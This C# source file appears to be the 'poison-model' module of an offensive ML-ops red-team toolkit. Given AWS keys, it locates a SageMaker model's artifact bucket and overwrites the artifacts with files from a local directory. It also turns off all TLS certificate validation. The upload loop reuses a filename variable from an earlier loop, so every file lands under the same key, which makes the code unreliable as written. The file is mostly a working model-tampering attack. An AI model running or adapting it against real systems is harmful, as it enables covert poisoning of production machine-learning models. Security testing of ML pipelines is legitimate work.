using System;
using System.Net;
using System.Threading.Tasks;
using System.Threading;
using System.Security.Cryptography.X509Certificates;
using System.Net.Security;
using System.Collections.Generic;
using System.IO;
using Amazon;
using Amazon.S3;
using Amazon.S3.Model;
using Amazon.SageMaker;
using Amazon.SageMaker.Model;

namespace MLOKit.Modules.SageMaker
{
    class PoisonModel
    {
        public static async Task execute(string credential, string platform, string modelID, string sourceDir, RegionEndpoint endpoint)
        {
            // Generate module header
            Console.WriteLine(Utilities.ArgUtils.GenerateHeader("poison-model", credential, platform));


            // ignore SSL errors
            ServicePointManager.ServerCertificateValidationCallback = delegate (object s, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors) { return true; };
            ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            try
            {

                Console.WriteLine("");
                Console.WriteLine("[*] INFO: Performing poison-model module for " + platform);
                Console.WriteLine("");

                // check if credentials provided are valid
                Console.WriteLine("[*] INFO: Checking credentials provided");
                Console.WriteLine("");

                string[] splitCreds = credential.Split(';');
                string accessKey = splitCreds[0];
                string secretKey = splitCreds[1];

                AmazonSageMakerClient sagemakerClient = new AmazonSageMakerClient(accessKey, secretKey, endpoint);
                ListModelsResponse response = await sagemakerClient.ListModelsAsync(new ListModelsRequest());

                // valid credentials
                if (response.HttpStatusCode.ToString().ToLower().Equals("ok"))
                {
                    Console.WriteLine("[+] SUCCESS: Credentials are valid");
                    Console.WriteLine("");

                    // create table header
                    string tableHeader = string.Format("{0,50} | {1,20} | {2,50}", "Model Name", "Creation Date", "Model ARN");
                    Console.WriteLine(tableHeader);
                    Console.WriteLine(new String('-', tableHeader.Length));

                    bool doesModelExist = false;

                    // iterate through each model and try to find the model specified
                    foreach (var model in response.Models)
                    {
                        string creationTime = model.CreationTime.ToShortDateString();

                        if (model.ModelName.ToLower().Equals(modelID.ToLower()))
                        {
                            doesModelExist = true;
                            Console.WriteLine("{0,50} | {1,20} | {2,50}", model.ModelName, creationTime, model.ModelArn);

                        }

                    }

                    // if model exists, proceed
                    if (doesModelExist)
                    {

                        // create the describe model request using the model name provided
                        DescribeModelRequest request = new DescribeModelRequest();
                        request.ModelName = modelID;
                        DescribeModelResponse describeResponse = await sagemakerClient.DescribeModelAsync(request);

                        Console.WriteLine("");
                        Console.WriteLine("[*] INFO: Model artifacts location");
                        Console.WriteLine("");

                        string bucketName = "";
                        string modelDataURL = "";

                        // get the model data URL and parse out the bucket name
                        foreach (var modelContainer in describeResponse.Containers)
                        {
                            modelDataURL = modelContainer.ModelDataUrl;
                            Console.WriteLine(modelDataURL);
                            string[] splitModelDataURL = modelDataURL.Split('/');
                            bucketName = splitModelDataURL[2];

                        }

                        Console.WriteLine("");
                        Console.WriteLine("[*] INFO: Checking access to S3 bucket with name: " + bucketName);
                        Console.WriteLine("");

                        AmazonS3Client s3Client = new AmazonS3Client(accessKey, secretKey, endpoint);
                        GetBucketVersioningResponse versionResponse = await s3Client.GetBucketVersioningAsync(bucketName);

                        // you have access to the bucket, proceed
                        if (versionResponse.HttpStatusCode.ToString().ToLower().Equals("ok"))
                        {

                            string fullPath = modelDataURL.Replace("s3://", "");
                            int lastIndexSlash = fullPath.LastIndexOf('/');
                            fullPath = fullPath.Substring(0, lastIndexSlash + 1);
                            string thePrefix = fullPath.Replace(bucketName + "/", "");

                            Console.WriteLine("[+] SUCCESS: You have access to S3 bucket with name: " + bucketName);
                            Console.WriteLine("");

                            // list all objects in the bucket
                            Console.WriteLine("[*] INFO: Listing prefix where files will be uploaded: " + thePrefix);
                            Console.WriteLine("");

                            // list all objects in the bucket
                            Console.WriteLine("[*] INFO: Listing files in source directory that will be uploaded");
                            Console.WriteLine("");

                            // if directory provided exists
                            if (Directory.Exists(sourceDir))
                            {

                                string theFile = "";

                                foreach (string fileName in Directory.EnumerateFiles(sourceDir))
                                {

                                    // get just the file name so we maintain that when downloading
                                    theFile = fileName;
                                    int lstIndex = theFile.LastIndexOf('\\');
                                    theFile = theFile.Substring(lstIndex + 1, theFile.Length - lstIndex - 1);
                                    Console.WriteLine(theFile);
                                }

                                // upload each file to the S3 location associated with the model to poison.
                                foreach (string fileName in Directory.EnumerateFiles(sourceDir))
                                {
                                    PutObjectRequest putObjectReq = new PutObjectRequest();
                                    putObjectReq.BucketName = bucketName;
                                    putObjectReq.Key = thePrefix + theFile;
                                    putObjectReq.FilePath = fileName;
                                    PutObjectResponse putObjectResp = await s3Client.PutObjectAsync(putObjectReq);

                                    Console.WriteLine("");
                                    Console.WriteLine("[+] SUCCESS: " + theFile + " written to: ");
                                    Console.WriteLine(bucketName + "/" + thePrefix + theFile);
                                    Console.WriteLine("");

                                }


                            }

                            // if directory provided doesn't exist, display message and return
                            else
                            {
                                Console.WriteLine("");
                                Console.WriteLine("[-] ERROR: Source directory provided does not exist. Please check source directory path again.");
                                Console.WriteLine("");
                            }




                        }
                        // if you don't have access, print error and return
                        else
                        {
                            Console.WriteLine("[-] ERROR: You do not have access to the S3 bucket containing the model artifacts");
                            Console.WriteLine("");
                        }

                    }
                    // if model doesn't exist, print error and return
                    else
                    {
                        Console.WriteLine("");
                        Console.WriteLine("[-] ERROR: Model provided does not exist. Please check model name again.");
                        Console.WriteLine("");
                    }

                }

            }
            catch (Exception ex)
            {
                Console.WriteLine("");
                Console.WriteLine("[-] ERROR: Please check your credentials and try again");
                Console.WriteLine("");
                Console.WriteLine("[-] ERROR: " + ex.Message);
                Console.WriteLine("");
            }



        }

    }
}
